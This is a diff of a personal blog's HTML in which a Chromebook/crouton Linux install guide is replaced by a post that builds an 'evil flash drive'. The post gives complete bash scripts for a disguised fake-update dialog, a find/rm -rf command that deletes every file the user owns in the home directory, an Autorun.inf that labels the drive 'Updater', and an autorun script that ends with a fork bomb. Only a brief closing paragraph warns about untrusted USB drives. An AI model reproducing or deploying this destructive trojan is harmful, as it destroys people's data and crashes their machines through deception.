@@ -11,7 +11,7 @@
 
   <title>
     
-      Installing Linux In Chromebook Using Crouton &middot; Nihaal Prasad
+      Basic Evil Flash Drive That Deletes Linux User's Data &middot; Nihaal Prasad
     
   </title>
 
@@ -184,7 +184,7 @@
 </div>
 
     <main class="container">
-      <h1 class="page-heading">Installing Linux In Chromebook Using Crouton</h1>
+      <h1 class="page-heading">Basic Evil Flash Drive That Deletes Linux User's Data</h1>
 <div class="content">
   <div class="post-meta">
   <span class="post-categories">
@@ -194,26 +194,102 @@
 
   <hr>
   <div class="post-body">
-    <p>In a <a href="../14/my-raspberrypi-workstation.html">previous blog post</a>, I mentioned being able to run Linux on a Chromebook. Normally, ChromeOS (which is one of the most useless OSes created) just allows the user to do very basic tasks, such as browsing the internet or accessing documents, and is more geared towards older and more non-technical users. However, it is possible to unlock other potential uses for ChromeOS, one of which is running Linux on the Chromebook. In this post, I’m going to go ahead and show you exactly how I was able to get Ubuntu up and running in my Chromebook using a nice tool called <a href="https://github.com/dnschneid/crouton">crouton</a>.</p>
+    <p>Today I’m going to be going over how to setup an evil flash drive that can easily destroy the data of whoever runs it. This is a simple program that is mainly coded from just with a few bash files. It will masquerade as an updating software inside a flash drive that will bring up a little pop up saying that it is installing computer updates. Finally, once it is done deleting files that are owned by the user, it will bring up a <a href="https://en.wikipedia.org/wiki/Fork_bomb">fork bomb</a> to crash the computer. Since I use Ubuntu as my main operating system, I’m mainly making this flash drive to target Linux systems. Making a flash drive that targets Windows systems would be slightly different, but the idea would remain the same.</p>
 
-<p>The first step is to boot the Chromebook in recovery mode. This is done by pressing and holding the escape and refresh keys while pressing the power button at the same time. Once recovery mode opens up, press Ctrl-D to switch to developer mode. It will take a little while for the Chromebook to finish switching to developer mode, but once it is done, you will see a screen that looks like this:</p>
+<p><img style="margin-left: auto; margin-right: auto; width: 25%; height: 25%;" src="../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/updates.png" /></p>
 
-<p><img src="../../../assets/img/2019-1-15-installing-linux-in-chromebook/boot.jpg" /></p>
+<p>So lets jump right into it. I had a flash drive that I just reformatted into <a href="https://en.wikipedia.org/wiki/Ext4">ext4</a>. The first thing that I did was create a folder called “updates” in my flash drive, which would be used to hold majority of the code. My next task was to develop the updater pop-up that you see above. This was quite simple to create; all I did was use a program called <a href="https://en.wikipedia.org/wiki/Zenity">Zenity</a> to bring up the updating window. Zenity is a tool used to easily develop these dialog boxes using commands from the terminal. It was already installed by default on my Ubuntu machine, so it was my natural choice to create the dialog box. By running the below command, I was able to develop the window that you see above:</p>
 
-<p>Wait another minute, and it should reboot into ChromeOS. Sometimes you’ll hear two loud beeps coming out of the notebook. Now the Chromebook will always use developer mode whenever you boot into it (unless you turn it off).</p>
-
-<p>The next step is to install crouton. Click <a href="https://goo.gl/fd3zc">here</a> and place the file in the Downloads folder. Next, go into the Chromebook’s terminal by pressing Ctrl+Alt+T. Type in “shell” in the black window that pops up to open up the shell. Then run this command to install Linux onto the Chromebook:</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo sh ~/Downloads/crouton -t gnome
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zenity --progress --pulsate --no-cancel --text="Updating..."
 </code></pre></div></div>
 
-<p>This will install Ubuntu by default, but you can change which OS is installed. Typing in “sudo sh ~/Downloads/crouton -r list” will show a list of operating systems that are supported by crouton. Typing in “sudo sh ~/Downloads/crouton -r [operating system]” will install that specific OS. To install a specific GUI, use the “-t” switch (and use “-t list” to list out all the different desktop environments).</p>
+<p>However, my usage of zenity caused a slight problem. What if this flash drive was going to be put into a system that didn’t have Zenity installed? To solve this problem, I typed in this command to find the location of zenity:</p>
 
-<p>It will take a few minutes to completely install the OS, and will also ask you to create a username and password for an account on the newly created chroot. Once this is done, you can type in “startgnome” to switch to that operating system (note that this command will change if you’ve installed a different GUI).</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whereis zenity
+</code></pre></div></div>
 
-<p><img src="../../../assets/img/2019-1-15-installing-linux-in-chromebook/linux.jpg" /></p>
+<p>And got this output:</p>
 
-<p>You should now be able to use Ctrl+Shift+Alt+Forward and Ctrl+Shift+Alt+Backward (Forwards and backwards keys are found at the upper left corner) to move back and forth between OSes.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zenity: /usr/bin/zenity /usr/share/zenity /usr/share/man/man1/zenity.1.gz
+</code></pre></div></div>
+
+<p>So, I went ahead and copied the version of zenity located in /usr/bin/zenity to the updates folder located in my flash drive and renamed the program to “updater” so that it was less obvious that it was, in fact, not used for updating your computer. Now my flash drive could run the zenity program directly from the flash drive, which meant that even if this flash drive was put into a computer that did not have zenity installed, it could still run zenity.</p>
+
+<p>After that, I needed a script that would run zenity from the flash drive, so I made a file called updates.sh inside the updates folder and put this code inside of it:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="nb">cd</span> <span class="s2">"</span><span class="k">$(</span><span class="nb">dirname</span> <span class="s2">"</span><span class="nv">$0</span><span class="s2">"</span><span class="k">)</span><span class="s2">"</span>
+./updater <span class="nt">--progress</span> <span class="nt">--pulsate</span> <span class="nt">--no-cancel</span> <span class="nt">--text</span><span class="o">=</span><span class="s2">"Updating..."</span>
+</code></pre></div></div>
+<p>All that this code does is cd into the current directory and run zenity (which I renamed to updater) using the flags that create the window that I wanted.</p>
+
+<p>The next step was to create a bash file that could do actual damage to the system. Inside the updates folder, I made a file called “data.sh”, which would be used to destroy the data. I added this code into the file:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="nb">sleep </span>5
+<span class="nv">x</span><span class="o">=</span><span class="k">$(</span><span class="nb">eval</span> <span class="s2">"whoami"</span><span class="k">)</span>
+find <span class="nv">$HOME</span> <span class="nt">-user</span> <span class="nv">$x</span> <span class="nt">-exec</span> <span class="nb">rm</span> <span class="nt">-rf</span> <span class="o">{}</span> <span class="se">\;</span>
+</code></pre></div></div>
+<p>I added the “sleep 5” command so that the user could view the zenity window for five seconds before watching their files be utterly demolished. The next line of code figures out the user’s username, which is needed to run the next command. The find command that comes right after that will find all of the documents that the user owns and deletes them one by one. I didn’t use rm -rf /, which is the usual way that people delete files, because that requires root permissions to delete most of those files, and I wanted to be able to run this without asking the user for root permissions. That is why I instead use the find command to find files that the user owns instead of wasting my time with files that the user does not have permission to delete anyways.</p>
+
+<p>I also downloaded an icon that looked sort of like an updating computer, and placed that under the updates folder. This icon will eventually be seen on the user’s desktop.</p>
+
+<p>The next thing I did was to go to the root of the flash drive directory (outside the /updates folder), and create a file called Autorun.inf. This is a special file that will tell the operating system certain information about this particular flash drive. I added these lines of code into this file:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[autorun]
+Open=autorun.sh
+Action=Start Updates
+Label=Updater
+Icon=updates/updater.png
+</code></pre></div></div>
+<p>This tells the operating system to open “autorun.sh” by default when this flash drive is connected, use the label of “Updater,” and use the icon located in the updates folder. It looked something like the image below when I reconnected the flash drive.</p>
+
+<p><img style="margin-left: auto; margin-right: auto; width: 25%; height: 25%;" src="../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/icon.png" /></p>
+
+<p>Finally, I only had one more little step to do. I just had to create an autorun.sh file that would run when the flash drive was inserted. (By default, linux will usually bring up a pop-up asking the user “Would you like to run the software on this flash drive?” for security reasons. Technically this will not be run right when the flash drive is inserted, but only after the user allows it to run. If it was not setup like this by default, then that could cause a huge security hole because a malicious user could insert a flash drive into any computer and run whatever they wanted.) I created an autorun.sh file at the root directory of my flash drive and put this inside it:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nb">cd</span> <span class="s2">"</span><span class="k">$(</span><span class="nb">dirname</span> <span class="s2">"</span><span class="nv">$0</span><span class="s2">"</span><span class="k">)</span><span class="s2">"</span>
+<span class="nb">cd </span>updates
+
+./data.sh | ./updates.sh
+./updater <span class="nt">--info</span> <span class="nt">--text</span><span class="o">=</span><span class="s2">"Your computer has finished all updates."</span>
+
+:<span class="o">(){</span>:|:&amp;<span class="o">}</span><span class="p">;</span>:
+</code></pre></div></div>
+<p>The first thing that this bash file does is that it changes into the directory of the updates folder. After that, it runs data.sh and updates.sh at the same time (The pipette is used so that when data.sh is done deleting all of the files, updates.sh will also stop as well). After that, it will use zenity to print out a message saying “Your computer has finished all updates.” Then the code ends by delivering the fork bomb.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>:() {
+    :|:&amp;
+};
+:
+</code></pre></div></div>
+
+<p>A fork bomb, in case you do not know, is a piece of bash code that will usually result in the computer crashing (although many operating systems today will have some defenses setup), and even if the computer doesn’t crash, it will usually slow it down. When you break down the fork bomb, there are three main parts to it (as shown above). 1.) It defines a function called “:” using “:()”. 2.) It opens the body of the function using the curly bracket. Inside the body of the function, it calls itself using “:|:&amp;”. The “&amp;” is used to run something in the background, and the pipette can be used to run another command in the background, so “:|:&amp;” makes the function call itself twice and background it. Each call to “:” spawns even more calls to “:”, leading to an infinitely recursive process that slowly consumes the system resources. 3.) The program will then close the function using “};”, then it will call the function with the last “:”, which begins this whole process. For your convenience, A better looking version of the fork bomb is below:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>foo() {
+    call foo | call foo &amp;
+};
+call foo
+</code></pre></div></div>
+<p>This pretty much wraps up this blog post. All I did now was just set all of my bash files to executable using the “chmod +x [file]” command. I ran the evil flash drive inside an Ubuntu virtual machine, and it worked perfectly. Everything in the user’s home directory was demolished, and a pop up saying “Ubuntu experienced a system error” even came up.</p>
+
+<p><img src="../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/runsoftware.png" /></p>
+
+<p>First it asked me whether I wanted to run the software (which was the security issue I mentioned earlier).</p>
+
+<p><img src="../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/updating.png" /></p>
+
+<p>Then it started to show the pulsating update bar.</p>
+
+<p><img src="../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/doneupdating.png" /></p>
+
+<p>Once it was done deleting all of my files (it didn’t take too long, I didn’t have much in my virtual machine), the updates bar was completely filled.</p>
+
+<p><img src="../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/finishedupdates.png" /></p>
+
+<p>It states that I have completed all of my updates.</p>
+
+<p><img src="../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/thereaintshit.png" /></p>
+
+<p>As you can see, everything in my home folder is now gone. Also, the fork bomb that I implemented earlier is running in the background, making this virtual machine run a lot slower.</p>
+
+<p>While this was just a basic program that could easily be built in a few minutes, much more advanced evil USBs have been built. For example, <a href="https://www.ncsc.gov.uk/content/files/protected_files/guidance_files/The-bad-USB-vulnerability1.pdf">these guys</a> were able to create a USB that could impersonate a different USB peripheral without the user noticing. This just goes to show that you should not plug in any USB flash drive unless you know that does not contain any malicious programs. You should especially never plug in a random USB that you found without knowing and trusting its source.</p>
 
     
 
@@ -230,8 +306,8 @@
   <ul class="post-list">
     
       <li style="color: black">
-        <a href="/2019/01/25/flash-drive-that-deletes-everything.html">
-          Basic Evil Flash Drive That Deletes Linux User's Data
+        <a href="/2019/01/15/installing-linux-in-chromebook.html">
+          Installing Linux In Chromebook Using Crouton
         </a>
       </li>
     
